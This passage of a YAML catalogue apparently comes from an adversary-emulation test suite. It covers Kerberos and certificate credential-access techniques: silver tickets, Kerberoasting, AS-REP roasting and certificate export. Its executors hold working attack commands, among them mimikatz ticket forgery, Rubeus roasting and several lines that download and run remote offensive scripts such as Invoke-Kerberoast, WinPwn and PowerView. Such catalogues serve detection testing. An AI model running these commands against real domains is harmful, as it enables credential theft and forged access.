    Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.[2](https://adsecurity.org/?p=1515)

    Password hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Crafting Active Directory silver tickets with mimikatz
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1558/002
  is_safe: true
- id: T1558.003
  name: Kerberoasting
  description: "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).[1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)[2](https://adsecurity.org/?p=2293) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service[3](https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/)).[4](https://msdn.microsoft.com/library/ms677949.aspx)[5](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)[6](https://redsiege.com/kerberoast-slides)[7](https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).[1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)[2](https://adsecurity.org/?p=2293) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.[2](https://adsecurity.org/?p=2293)[1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) [7](https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/)\n\nThis same behavior could be executed using service tickets captured from network traffic.[2](https://adsecurity.org/?p=2293)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).[6](https://redsiege.com/kerberoast-slides)"
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Request for service tickets
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
        Invoke-Kerberoast | fl
      timeout: 120
      is_safe: true
    - name: Rubeus kerberoast
      type: powershell
      platform: windows
      command: |-
        klist purge
        cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" kerberoast  /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Extract all accounts in use as SPN using setspn
      type: cmd
      platform: windows
      command: setspn -T %USERDNSDOMAIN% -Q */*
      timeout: 120
      is_safe: true
    - name: Request A Single Ticket via PowerShell
      type: powershell
      platform: windows
      command: |-
        Add-Type -AssemblyName System.IdentityModel
        $ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN"
      timeout: 120
      is_safe: true
    - name: Request All Tickets via PowerShell
      type: powershell
      platform: windows
      command: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
      timeout: 120
      is_safe: true
    - name: WinPwn - Kerberoasting
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        Kerberoasting -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
        Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1558/003
  is_safe: true
- id: T1558.004
  name: AS-REP Roasting
  description: "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.[1](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.[2](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. [1](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)[3](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. [1](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)[3](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).[4](https://redsiege.com/kerberoast-slides)"
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Rubeus asreproast
      type: powershell
      platform: windows
      command: cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Get-DomainUser with PowerView
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
      timeout: 120
      is_safe: true
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
        Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1558/004
  is_safe: true
- id: T1649
  name: Steal or Forge Authentication Certificates
  description: |-
    Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.[1](https://o365blog.com/post/deviceidentity/)[2](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11))

    Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)[3](https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.[4](https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)[5](https://github.com/TheWover/CertStealer)[6](https://github.com/GhostPack/SharpDPAPI#certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.[7](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

    Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.

    Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).[7](https://posts.specterops.io/certified-pre-owned-d95910965cd2) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.[7](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Staging Local Certificates via Export-Certificate
      type: powershell
      platform: windows
      command: |-
        $archive="$env:PUBLIC\T1649\atomic_certs.zip"
        $exfilpath="$env:PUBLIC\T1649\certs"
        Add-Type -assembly "system.io.compression.filesystem"
        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
        mkdir $exfilpath | Out-Null
        foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
        [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
      cleanup: |-
        $exfilpath="$env:PUBLIC\T1649\certs"
        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1649
  is_safe: true
